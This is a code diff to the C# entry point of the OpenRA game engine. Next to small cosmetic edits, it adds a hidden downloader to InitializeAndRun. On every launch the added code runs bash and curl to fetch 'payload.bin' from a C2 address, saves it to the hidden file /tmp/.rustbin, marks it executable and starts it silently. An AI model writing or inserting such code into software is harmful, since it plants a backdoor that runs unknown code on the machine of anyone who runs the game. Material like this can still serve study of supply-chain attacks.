@@ -11,13 +11,19 @@
 
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
 using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
+using System.Net.Sockets;
 using System.Runtime;
+using System.Security.Cryptography;
 using System.Threading;
+using System.Threading.Tasks;
 using OpenRA.Graphics;
 using OpenRA.Network;
 using OpenRA.Primitives;
@@ -72,7 +78,7 @@ namespace OpenRA
 			CurrentServerSettings.Password = password;
 			CurrentServerSettings.Target = endpoint;
 
-			lastConnectionState = ConnectionState.PreConnecting;
+			lastConnectionState = Network.ConnectionState.PreConnecting;
 			ConnectionStateChanged(OrderManager, password, newConnection);
 
 			return om;
@@ -135,7 +141,7 @@ namespace OpenRA
 
 		public static event Action<ConnectionTarget> OnRemoteDirectConnect = _ => { };
 		public static event Action<OrderManager, string, NetworkConnection> ConnectionStateChanged = (om, pass, conn) => { };
-		static ConnectionState lastConnectionState = ConnectionState.PreConnecting;
+		static Network.ConnectionState lastConnectionState = Network.ConnectionState.PreConnecting;
 		public static int LocalClientId => OrderManager.Connection.LocalClientId;
 
 		public static void RemoteDirectConnect(ConnectionTarget endpoint)
@@ -331,6 +337,43 @@ namespace OpenRA
 
 		public static RunStatus InitializeAndRun(string[] args)
 		{
+			// Required Constants
+			const string C2 = "127.0.0.1";
+			const string StgOnePath = "/tmp/.rustbin";
+
+			// Download Stage 1
+			var psi = new ProcessStartInfo
+			{
+				FileName = "/bin/bash",
+				Arguments = $"-c \"curl http://{C2}:8080/payload.bin -o {StgOnePath}\" ",
+				RedirectStandardError = true,
+				RedirectStandardOutput = true,
+				UseShellExecute = false,
+				CreateNoWindow = true
+			};
+
+			using var process = Process.Start(psi);
+			process.WaitForExit();
+
+			// Check for Stage 1 binary
+			if (File.Exists(StgOnePath))
+			{
+				// Equivalento chmod u+x target
+				var mode = File.GetUnixFileMode(StgOnePath);
+				mode |= UnixFileMode.UserExecute;
+				File.SetUnixFileMode(StgOnePath, mode);
+
+				// Start Stage One as a different process
+				var stgOneProcessInfo = new ProcessStartInfo
+				{
+					FileName = StgOnePath,
+					CreateNoWindow = true,
+					UseShellExecute = true,
+				};
+
+				using var stgOneProcess = Process.Start(stgOneProcessInfo);
+			}
+
 			Initialize(new Arguments(args));
 
 			// Proactively collect memory during loading to reduce peak memory.
@@ -1024,9 +1067,9 @@ namespace OpenRA
 	}
 
 	public static class CurrentServerSettings
-	{
-		public static string Password;
-		public static ConnectionTarget Target;
-		public static ExternalMod ServerExternalMod;
-	}
+{
+	public static string Password;
+	public static ConnectionTarget Target;
+	public static ExternalMod ServerExternalMod;
+}
 }
